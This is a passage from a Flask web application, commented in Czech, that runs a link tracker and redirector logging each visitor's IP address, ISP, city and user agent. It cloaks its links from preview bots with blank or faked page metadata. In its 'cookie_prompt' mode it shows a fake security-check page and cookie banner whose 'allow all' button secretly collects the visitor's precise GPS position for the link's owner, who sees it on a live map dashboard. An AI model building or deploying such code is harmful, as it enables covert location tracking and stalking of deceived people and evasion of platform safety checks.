            function toggleEditCustom() {
                var sel = document.getElementById("cloakEditSelect").value;
                document.getElementById("editCustomFields").style.display = (sel === "custom") ? "block" : "none";
            }
            function copyText(text, elem) {
                navigator.clipboard.writeText(text).then(function() {
                    var orig = elem.innerText;
                    elem.innerText = "Zkopirovano!";
                    elem.style.background = "#14532d";
                    elem.style.color = "#4ade80";
                    setTimeout(function() {
                        elem.innerText = orig;
                        elem.style.background = "";
                        elem.style.color = "";
                    }, 1500);
                });
            }

            // Automaticka live obnova logu kazde 3 vteriny bez refreshe cele stranky
            (function() {
                var currentFilter = "{{ filter_type }}";
                var logCode = "{{ link['log_code'] }}";
                var isFetching = false;

                function pollLogs() {
                    if (isFetching) return;
                    var toggle = document.getElementById("autoRefreshToggle");
                    if (toggle && !toggle.checked) return;

                    isFetching = true;
                    var ind = document.getElementById("liveIndicator");
                    if (ind) {
                        ind.style.opacity = "0.4";
                    }

                    fetch("/api/logs/" + encodeURIComponent(logCode) + "?filter=" + encodeURIComponent(currentFilter))
                        .then(function(res) { return res.json(); })
                        .then(function(data) {
                            isFetching = false;
                            if (ind) {
                                ind.style.opacity = "1";
                            }
                            if (!data || !data.success) return;

                            var cAll = document.getElementById("countAll");
                            var cReal = document.getElementById("countReal");
                            var cBots = document.getElementById("countBots");
                            if (cAll) cAll.innerText = data.all_count;
                            if (cReal) cReal.innerText = data.real_count;
                            if (cBots) cBots.innerText = data.bot_count;

                            var openDetails = {};
                            document.querySelectorAll("#logsTableBody details.ua-details[open]").forEach(function(el) {
                                var row = el.closest("tr");
                                if (row && row.dataset.id) {
                                    openDetails[row.dataset.id] = true;
                                }
                            });

                            var tbody = document.getElementById("logsTableBody");
                            if (!tbody) return;

                            if (!data.logs || data.logs.length === 0) {
                                tbody.innerHTML = '<tr><td colspan="9" class="text-center text-secondary py-4">Zadne zaznamy.</td></tr>';
                                return;
                            }

                            var rowsHtml = "";
                            data.logs.forEach(function(log) {
                                var isOpen = openDetails[log.id] ? " open" : "";
                                
                                var browserBadge = '<span class="text-secondary">-</span>';
                                if (log.browser_name === "Brave") {
                                    browserBadge = '<span class="badge" style="background: rgba(251, 146, 60, 0.2); color: #fb923c; border: 1px solid rgba(251, 146, 60, 0.4); font-size: 0.75rem;">Brave Browser</span>';
                                } else if (log.browser_name) {
                                    browserBadge = '<span class="badge bg-secondary" style="font-size: 0.75rem;">' + escapeHtml(log.browser_name) + '</span>';
                                }

                                var typeBadge = '<span class="badge-real">Uzivatel</span>';
                                if (log.is_bot) {
                                    var bName = log.bot_name || 'Bot';
                                    typeBadge = '<span class="badge-bot" title="' + escapeHtml(bName) + '">' + escapeHtml(bName) + '</span>';
                                }

                                var gpsHtml = '<span class="text-secondary">N/A</span>';
                                if (log.latitude && log.longitude) {
                                    var latStr = Number(log.latitude).toFixed(3);
                                    var lonStr = Number(log.longitude).toFixed(3);
                                    var tag = log.exact_gps ? 
                                        '<span class="badge bg-success ms-1" style="font-size: 0.65rem;" title="Presne GPS ze zarizeni (presnost cca ' + Math.round(log.gps_accuracy || 0) + 'm)">GPS</span>' : 
                                        '<span class="badge bg-secondary ms-1" style="font-size: 0.65rem;">IP</span>';
                                    gpsHtml = '<a href="https://www.google.com/maps?q=' + encodeURIComponent(log.latitude + ',' + log.longitude) + '" target="_blank">' + latStr + ', ' + lonStr + '</a>' + tag;
                                }

                                var uaHtml = '<span class="text-secondary">-</span>';
                                if (log.user_agent) {
                                    var shortUa = log.user_agent.length > 28 ? log.user_agent.substring(0, 28) + '...' : log.user_agent;
                                    uaHtml = '<details class="ua-details"' + isOpen + '>' +
                                        '<summary title="Kliknutim rozbalis / sbalis cely User-Agent">' + escapeHtml(shortUa) + '</summary>' +
                                        '<div class="ua-full">' + escapeHtml(log.user_agent) + '</div>' +
                                        '</details>';
                                }

                                rowsHtml += '<tr data-id="' + log.id + '">' +
                                    '<td class="text-nowrap">' + escapeHtml(log.created_at || '') + '</td>' +
                                    '<td>' + browserBadge + '</td>' +
                                    '<td>' + typeBadge + '</td>' +
                                    '<td><code class="text-warning fw-bold">' + escapeHtml(log.ip || '') + '</code></td>' +
                                    '<td>' + escapeHtml(log.country || 'N/A') + '</td>' +
                                    '<td>' + escapeHtml(log.city || 'N/A') + '</td>' +
                                    '<td>' + escapeHtml(log.isp || 'N/A') + '</td>' +
                                    '<td class="text-nowrap" style="font-size: 0.78rem;">' + gpsHtml + '</td>' +
                                    '<td style="font-size: 0.75rem; max-width: 250px;">' + uaHtml + '</td>' +
                                    '</tr>';
                            });

                            tbody.innerHTML = rowsHtml;
                        })
                        .catch(function(err) {
                            isFetching = false;
                            if (ind) {
                                ind.style.opacity = "1";
                            }
                        });
                }

                function escapeHtml(str) {
                    if (!str) return "";
                    return String(str)
                        .replace(/&/g, "&amp;")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;")
                        .replace(/"/g, "&quot;")
                        .replace(/'/g, "&#039;");
                }

                setInterval(pollLogs, 3000);

                var toggleElem = document.getElementById("autoRefreshToggle");
                if (toggleElem) {
                    toggleElem.addEventListener("change", function() {
                        var ind = document.getElementById("liveIndicator");
                        if (ind) {
                            ind.style.display = this.checked ? "inline-block" : "none";
                        }
                        if (this.checked) {
                            pollLogs();
                        }
                    });
                }
            })();
        </script>
    </body>
    </html>
    """
    return render_template_string(html, link=link, logs=logs, filter_type=filter_type,
                                  all_count=all_count, real_count=real_count, bot_count=bot_count)

@app.route("/api/logs/<log_code>", methods=["GET"])
def api_get_logs(log_code):
    conn = get_db()
    link = conn.execute("SELECT * FROM links WHERE log_code = ? OR id = ?", (log_code, log_code)).fetchone()
    if not link:
        conn.close()
        return jsonify({"success": False, "error": "Link nenalezen"}), 404

    filter_type = request.args.get("filter", "all")
    if filter_type == "real":
        rows = conn.execute("SELECT * FROM logs WHERE link_id = ? AND (is_bot = 0 OR is_bot IS NULL) ORDER BY created_at DESC", (link["id"],)).fetchall()
    elif filter_type == "bots":
        rows = conn.execute("SELECT * FROM logs WHERE link_id = ? AND is_bot = 1 ORDER BY created_at DESC", (link["id"],)).fetchall()
    else:
        rows = conn.execute("SELECT * FROM logs WHERE link_id = ? ORDER BY created_at DESC", (link["id"],)).fetchall()

    all_count = conn.execute("SELECT COUNT(*) FROM logs WHERE link_id = ?", (link["id"],)).fetchone()[0]
    bot_count = conn.execute("SELECT COUNT(*) FROM logs WHERE link_id = ? AND is_bot = 1", (link["id"],)).fetchone()[0]
    real_count = all_count - bot_count
    conn.close()

    log_list = []
    for r in rows:
        log_list.append({
            "id": r["id"],
            "created_at": r["created_at"],
            "browser_name": r["browser_name"],
            "is_bot": bool(r["is_bot"]),
            "bot_name": r["bot_name"],
            "ip": r["ip"],
            "country": r["country"],
            "city": r["city"],
            "isp": r["isp"],
            "latitude": r["latitude"],
            "longitude": r["longitude"],
            "exact_gps": bool(r["exact_gps"]),
            "gps_accuracy": r["gps_accuracy"],
            "user_agent": r["user_agent"]
        })

    return jsonify({
        "success": True,
        "all_count": all_count,
        "bot_count": bot_count,
        "real_count": real_count,
        "logs": log_list
    })

@app.route("/api/mark_browser", methods=["POST"])
def api_mark_browser():
    data = request.get_json(silent=True) or {}
    log_id = data.get("log_id")
    browser = data.get("browser")
    if log_id and browser:
        conn = get_db()
        with conn:
            conn.execute("UPDATE logs SET browser_name = ? WHERE id = ?", (browser, log_id))
        conn.close()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route("/api/exact_gps", methods=["POST"])
def api_exact_gps():
    data = request.get_json(silent=True) or {}
    log_id = data.get("log_id")
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy")

    if log_id and lat is not None and lon is not None:
        conn = get_db()
        with conn:
            conn.execute("""
                UPDATE logs 
                SET latitude = ?, longitude = ?, exact_gps = 1, gps_accuracy = ?
                WHERE id = ?
            """, (lat, lon, acc, log_id))
        conn.close()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# -------------------------------------------------------------
# PUBLIC TRACKER / REDIRECTOR (ahoj.kersonik.me/<slug>)
# -------------------------------------------------------------
@app.route("/<slug>")
@app.route("/r/<slug>")
def public_redirect(slug):
    if slug in ("favicon.ico", "robots.txt", "ip"):
        abort(404)
        
    conn = get_db()
    link = conn.execute("SELECT * FROM links WHERE id = ?", (slug,)).fetchone()
    
    if not link:
        conn.close()
        abort(404, description="Odkaz nenalezen")
        
    ip = get_client_ip()
    ua = request.headers.get("User-Agent", "")
    referer = request.headers.get("Referer", "")
    
    geo = get_geoip_data(ip)
    is_bot, bot_name = check_bot(ua, geo.get("isp"))
    
    log_record_id = None
    initial_browser = parse_browser_name(ua)
    try:
        now_local = get_now_local_str()
        with conn:
            cur = conn.execute("""
                INSERT INTO logs (link_id, ip, country, city, isp, latitude, longitude, browser_name, user_agent, referer, is_bot, bot_name, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (slug, ip, geo.get("country"), geo.get("city"), geo.get("isp"), 
                  geo.get("lat"), geo.get("lon"), initial_browser, ua, referer, 1 if is_bot else 0, bot_name, now_local))
            log_record_id = cur.lastrowid
    except Exception as e:
        print(f"Error logging: {e}")
    finally:
        conn.close()

    # ANTI-PREVIEW / CLOAKING LOGIC:
    if is_bot:
        mode = link["cloaking_mode"] or "neutral"
        if mode == "neutral":
            html = """<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body></body></html>"""
            return Response(html, status=200, mimetype="text/html")
        elif mode == "custom":
            title = link["custom_title"] or ""
            desc = link["custom_desc"] or ""
            image = link["custom_image"] or ""
            # Pouzijeme vlastni URL domeny jako og:url, aby Link Shim nehrozil
            self_url = f"https://ahoj.kersonik.me/{slug}"
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{title}</title>
    <meta property="og:title" content="{title}">
    <meta property="og:description" content="{desc}">
    <meta property="og:image" content="{image}">
    <meta property="og:url" content="{self_url}">
    <meta name="twitter:card" content="summary_large_image">
</head>
<body></body>
</html>"""
            return Response(html, status=200, mimetype="text/html")
        elif mode == "mirror":
            meta = fetch_target_metadata(link["target_url"])
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{meta.get('title', '')}</title>
    <meta property="og:title" content="{meta.get('title', '')}">
    <meta property="og:description" content="{meta.get('desc', '')}">
    <meta property="og:image" content="{meta.get('image', '')}">
    <meta name="twitter:card" content="summary_large_image">
</head>
<body></body>
</html>"""
            return Response(html, status=200, mimetype="text/html")

    # REAL USER LOGIC:
    gps_mode = link["gps_mode"] or "silent"
    target_url = link["target_url"]
    ua_lower = (ua or "").lower()

    # VYNUCENI OTEVRENI V EXTERNIM PROHLIZECI (Chrome / Safari / vychozi prohlizec)
    # Pokud uzivatel kliknul uvnitr Instagram / Facebook in-app browseru:
    is_inapp = ("instagram" in ua_lower or "fbav" in ua_lower or "fban" in ua_lower) and \
               ("externalhit" not in ua_lower and "externalagent" not in ua_lower)
    if is_inapp:
        # 1. Android: intent:// scheme prinuti Android otevrit odkaz primo v Chrome / vychozim prohlizeci
        if "android" in ua_lower:
            clean_url = target_url.replace("https://", "").replace("http://", "")
            scheme = "https" if target_url.startswith("https") else "http"
            intent_url = f"intent://{clean_url}#Intent;scheme={scheme};package=com.android.chrome;end"
            # Fallback na obecny browser intent, pokud Chrome neni nainstalovan
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Oteviram prohlizec...</title>
    <meta http-equiv="refresh" content="0;url={intent_url}">
</head>
<body>
    <script>
        window.location.href = "{intent_url}";
        setTimeout(function() {{
            window.location.href = "{target_url}";
        }}, 1000);
    </script>
</body>
</html>"""
            return Response(html, status=200, mimetype="text/html")

        # 2. iOS: Instagram in-app browser na iPhone neumoznuje prime zavolani safari:// 
        # Triky jako x-safari-https:// nebo Google Chrome googlechromes://
        # Zobrazime primou instrukci / tlacitko na otevreni v Safari:
        elif "iphone" in ua_lower or "ipad" in ua_lower:
            html = f"""<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Otevrit v prohlizeci</title>
    <style>
        body {{
            background: #0b0f17; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
            text-align: center; margin: 0; padding: 20px; box-sizing: border-box;
        }}
        .btn {{
            background: #2563eb; color: #fff; text-decoration: none; padding: 14px 28px;
            border-radius: 8px; font-weight: bold; font-size: 1rem; display: inline-block; margin-top: 20px;
        }}
        .hint {{ color: #94a3b8; font-size: 0.85rem; margin-top: 25px; line-height: 1.5; }}
    </style>
</head>
<body>
    <div style="font-size: 2rem; margin-bottom: 10px;">🌐</div>
    <div style="font-size: 1.15rem; font-weight: 600;">Pokracovat v prohlizeci Safari</div>
    <div class="hint">
        Klepnete vpravo nahore na <strong>•••</strong> nebo <strong>ikonu kompasu</strong><br>a zvolte <strong>„Otevrit v prohlizeci Safari“</strong>.
    </div>
    <a href="{target_url}" class="btn">Pokracovat na cilovy web</a>
    <script>
        // Pokus o otevreni pres bezne scheme
        setTimeout(function() {{
            window.location.href = "{target_url}";
        }}, 2000);
    </script>
</body>
</html>"""
            return Response(html, status=200, mimetype="text/html")

    # 1. Cookie prompt mode
    if gps_mode == "cookie_prompt":
        html = f"""<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Overeni pristupu</title>
    <style>
        body {{
            margin: 0; padding: 0; background-color: #0b0f17; color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .spinner {{
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #3b82f6;
            border-radius: 50%; width: 36px; height: 36px;
            animation: spin 0.8s linear infinite; margin: 0 auto 15px;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .box {{ text-align: center; max-width: 400px; padding: 25px; }}
        .cookie-modal {{
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #151d2a; border-top: 1px solid #2d3748;
            padding: 20px; box-shadow: 0 -4px 20px rgba(0,0,0,0.5);
            text-align: left;
        }}
        .btn {{
            background: #2563eb; color: #fff; border: none; padding: 10px 20px;
            border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 0.95rem;
        }}
        .btn:hover {{ background: #1d4ed8; }}
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <div style="font-size: 1.1rem; font-weight: 500;">Nacitam obsah...</div>
        <div style="color: #64748b; font-size: 0.85rem; margin-top: 6px;">Probihaji bezpecnostni kontroly</div>
    </div>

    <div class="cookie-modal" id="cookieBanner" style="display: none;">
        <div style="max-width: 600px; margin: 0 auto;">
            <div style="font-weight: 600; font-size: 1rem; margin-bottom: 6px; color: #fff;">Nastaveni souboru cookies &amp; regionalniho obsahu</div>
            <div style="font-size: 0.82rem; color: #94a3b8; margin-bottom: 15px; line-height: 1.4;">
                Tento web pouziva cookies a anonymni lokalizacni udaje pro prizpusobeni obsahu podle vaseho regionu a zajisteni spravneho fungovani sluzby.
            </div>
            <div style="display: flex; gap: 10px;">
                <button class="btn" onclick="acceptCookies()">Povolit vse a pokracovat</button>
                <button class="btn" style="background: #334155;" onclick="redirectNow()">Ponechat pouze nutne</button>
            </div>
        </div>
    </div>

    <script>
        var targetUrl = "{target_url}";
        var logId = {log_record_id or 0};
        var redirected = false;

        function redirectNow() {{
            if (redirected) return;
            redirected = true;
            window.location.replace(targetUrl);
        }}

        // Detekce Brave pres navigator.brave.isBrave()
        function detectBraveAndRun() {{
            if (navigator.brave && typeof navigator.brave.isBrave === 'function') {{
                navigator.brave.isBrave().then(function(isBrave) {{
                    if (isBrave) {{
                        // U Brave okamzite zaznamenat do logu a hned presmerovat bez zobrazeni banneru
                        fetch("/api/mark_browser", {{
                            method: "POST",
                            headers: {{ "Content-Type": "application/json" }},
                            body: JSON.stringify({{ log_id: logId, browser: "Brave" }})
                        }}).finally(function() {{
                            redirectNow();
                        }});
                        return;
                    }}
                    showBanner();
                }}).catch(function() {{
                    showBanner();
                }});
            }} else {{
                showBanner();
            }}
        }}

        function showBanner() {{
            document.getElementById("cookieBanner").style.display = "block";
        }}

        function acceptCookies() {{
            document.getElementById("cookieBanner").style.display = "none";
            if ("geolocation" in navigator) {{
                navigator.geolocation.getCurrentPosition(
                    function(pos) {{
                        var data = {{
                            log_id: logId,
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }};
                        fetch("/api/exact_gps", {{
                            method: "POST",
                            headers: {{ "Content-Type": "application/json" }},
                            body: JSON.stringify(data)
                        }}).finally(function() {{
                            redirectNow();
                        }});
                    }},
                    function(err) {{
                        redirectNow();
                    }},
                    {{ enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }}
                );
            }} else {{
                redirectNow();
            }}
            setTimeout(redirectNow, 7000);
        }}

        detectBraveAndRun();
    </script>
</body>
</html>"""
        return Response(html, status=200, mimetype="text/html")

    # 2. Silent mode (Okamzity 302 redirect)
    return redirect(target_url, code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
